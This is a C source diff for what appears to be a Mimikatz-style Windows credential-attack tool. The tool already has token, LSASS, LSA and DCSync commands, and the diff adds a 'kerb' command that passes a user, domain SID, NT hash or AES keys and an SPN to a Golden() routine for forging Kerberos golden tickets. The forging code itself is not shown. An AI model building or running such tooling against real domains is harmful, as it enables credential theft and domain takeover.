@@ -1,3 +1,4 @@
+#pragma once
 // #include <stdlib.h>
 
 // #include "./include/token.c"
@@ -7,6 +8,8 @@
 #include "lsa/lsa.h"
 #include "lsass/lsass.h"
 #include "token/token.h"
+
+#include "kerberos/kerb.h"
 
 #include <argtable3.h>
 #include <wincrypt.h>
@@ -277,11 +280,67 @@ int cmd_dcsync(int argc, char *argv[]) {
   return 0;
 }
 
+int cmd_kerberos(int argc, char *argv[]) {
+  struct arg_end *end;
+  struct arg_lit *help;
+  struct arg_lit *gold;
+  struct arg_str *user;
+  struct arg_str *domain;
+  struct arg_str *domainSID;
+  struct arg_str *rc4;
+  struct arg_str *aes128;
+  struct arg_str *aes256;
+  struct arg_str *spn;
+
+  void *argtable[] = {
+      help = arg_lit0(NULL, "help", "show help"),
+      gold = arg_lit0(NULL, "gold?", "golden ticket?"),
+      user = arg_str1(NULL, "user", "<value>", "user to target"),
+      domain = arg_str1(NULL, "domain", "<value>", "domain"),
+      domainSID = arg_str0(NULL, "dsid", "<value>", "domain SID"),
+      rc4 = arg_str0(NULL, "rc4", "<value>", "nt hash"),
+      aes128 = arg_str0(NULL, "aes128", "<value>", "aes128 key"),
+      aes256 = arg_str0(NULL, "aes256", "<value>", "aes256 key"),
+      spn = arg_str0(NULL, "spn", "<value>", "spn to target"),
+      end = arg_end(20),
+  };
+  if (arg_nullcheck(argtable) != 0) {
+    printf("out of memory\n");
+    return 1;
+  }
+  int nerrors = arg_parse(argc, argv, argtable);
+  int narg = sizeof(argtable) / sizeof(argtable[0]);
+  if (nerrors > 0) {
+    arg_print_errors(stdout, end, "kerb");
+    printf("Try: kerb --help\n");
+    arg_freetable(argtable, narg);
+    return 1;
+  }
+  if (help->count > 0) {
+    printf("Usage: kerb");
+    arg_print_syntax(stdout, argtable, "\n");
+    arg_print_glossary(stdout, argtable, "  %-25s %s\n");
+    arg_freetable(argtable, narg);
+    return 0;
+  }
+  if (gold->count > 0) {
+    const char *domain_str = domain->sval[0];
+    const char *user_str = user->sval[0];
+    const char *rc4_str = rc4->sval[0];
+    const char *aes128_str = aes128->sval[0];
+    const char *aes256_str = aes256->sval[0];
+    const char *domainSID_str = domainSID->sval[0];
+    const char *spn_str = spn->sval[0];
+    Golden(domain_str, user_str, rc4_str, aes128_str, aes256_str, domainSID_str,
+           spn_str);
+  }
+
+  return 0;
+}
+
 struct command cmds[] = {
-    {"token", cmd_token},
-    {"lsass", cmd_lsass},
-    {"lsa", cmd_lsa},
-    {"dcsync", cmd_dcsync},
+    {"token", cmd_token},   {"lsass", cmd_lsass},   {"lsa", cmd_lsa},
+    {"dcsync", cmd_dcsync}, {"kerb", cmd_kerberos},
 
 };
 
